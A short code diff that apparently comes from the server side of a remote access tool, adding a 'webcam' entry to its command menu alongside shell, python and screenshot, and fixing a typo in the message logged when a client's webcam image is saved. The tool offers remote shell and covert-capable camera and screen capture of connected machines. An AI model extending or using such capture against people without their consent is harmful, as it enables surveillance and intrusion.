@@ -34,6 +34,7 @@ Available commands:
 shell
 python
 screenshot
+webcam
 exit/back
 """
 
@@ -239,7 +240,7 @@ class ServerCLI(BaseServer):
         with open(file_name, 'wb') as file:
             file.write(img_data)
         logging.info('Saved webcam capture at (%s): %s' % (client.id, file_name))
-        print(f'Saved webca capture: {file_name}')
+        print(f'Saved webcam capture: {file_name}')
 
 
 if __name__ == '__main__':
